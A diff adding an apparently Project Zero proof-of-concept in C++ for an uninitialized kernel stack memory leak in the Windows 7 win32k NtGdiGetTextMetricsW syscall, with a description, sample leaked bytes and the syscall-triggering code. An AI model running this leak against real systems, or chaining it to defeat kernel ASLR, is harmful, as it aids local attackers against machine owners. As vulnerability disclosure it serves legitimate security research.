@@ -1,0 +1,91 @@
+/*
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1180
+
+We have discovered that it is possible to disclose portions of uninitialized kernel stack memory to user-mode applications in Windows 7 (other systems untested) through the win32k!NtGdiGetTextMetricsW system call.
+
+The output structure used by the syscall, according to various sources, is TMW_INTERNAL, which wraps the TEXTMETRICW and TMDIFF structures (see e.g. the PoC for  issue #480 ). The disclosure occurs when the service is called against a Device Context with one of the stock fonts selected (we're using DEVICE_DEFAULT_FONT). Then, we can find 7 uninitialized kernel stack bytes at offsets 0x39-0x3f of the output buffer. An example output of the attached proof-of-concept program started on Windows 7 32-bit is as follows:
+
+--- cut ---
+00000000: 10 00 00 00 0d 00 00 00 03 00 00 00 03 00 00 00 ................
+00000010: 00 00 00 00 07 00 00 00 0f 00 00 00 bc 02 00 00 ................
+00000020: 00 00 00 00 60 00 00 00 60 00 00 00 20 00 22 21 ....`...`... ."!
+00000030: ac 20 20 00 00 00 00 21 ee[03 81 ff 35 64 36 8f].  ....!....5d6.
+00000040: 20 ff 80 20 ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ??  .. ............
+--- cut ---
+
+Here, the leaked bytes are "03 81 ff 35 64 36 8f". If we map the 0x39-0x3f offsets to the layout of the TMW_INTERNAL structure, it turns out that the 7 bytes in question correspond to the 3 alignments bytes past the end of TEXTMETRICSW (which itself has an odd length of 57 bytes), and the first 4 bytes of the TMDIFF structure.
+
+Triggering the vulnerability could allow local authenticated attackers to defeat certain exploit mitigations (kernel ASLR) or read other secrets stored in the kernel address space.
+*/
+
+#include <Windows.h>
+#include <cstdio>
+
+// For native 32-bit execution.
+extern "C"
+ULONG CDECL SystemCall32(DWORD ApiNumber, ...) {
+  __asm{mov eax, ApiNumber};
+  __asm{lea edx, ApiNumber + 4};
+  __asm{int 0x2e};
+}
+
+VOID PrintHex(PBYTE Data, ULONG dwBytes) {
+  for (ULONG i = 0; i < dwBytes; i += 16) {
+    printf("%.8x: ", i);
+
+    for (ULONG j = 0; j < 16; j++) {
+      if (i + j < dwBytes) {
+        printf("%.2x ", Data[i + j]);
+      }
+      else {
+        printf("?? ");
+      }
+    }
+
+    for (ULONG j = 0; j < 16; j++) {
+      if (i + j < dwBytes && Data[i + j] >= 0x20 && Data[i + j] <= 0x7e) {
+        printf("%c", Data[i + j]);
+      }
+      else {
+        printf(".");
+      }
+    }
+
+    printf("\n");
+  }
+}
+
+int main() {
+  // Windows 7 32-bit.
+  CONST ULONG __NR_NtGdiGetTextMetricsW = 0x10d9;
+
+  // Create a Device Context.
+  HDC hdc = CreateCompatibleDC(NULL);
+
+  // Get a handle to the stock font.
+  HFONT hfont = (HFONT)GetStockObject(DEVICE_DEFAULT_FONT);
+  if (hfont == NULL) {
+    printf("GetCurrentObject failed\n");
+    return 1;
+  }
+
+  // Select the font into the DC.
+  SelectObject(hdc, hfont);
+
+  // Trigger the vulnerability and dump the kernel output on stdout.
+  BYTE output[0x44] = { /* zero padding */ };
+  if (!SystemCall32(__NR_NtGdiGetTextMetricsW, hdc, output, sizeof(output))) {
+    printf("NtGdiGetTextMetricsW failed\n");
+    DeleteObject(hfont);
+    DeleteDC(hdc);
+    return 1;
+  }
+
+  PrintHex(output, sizeof(output));
+
+  // Free resources.
+  DeleteObject(hfont);
+  DeleteDC(hdc);
+
+  return 0;
+}
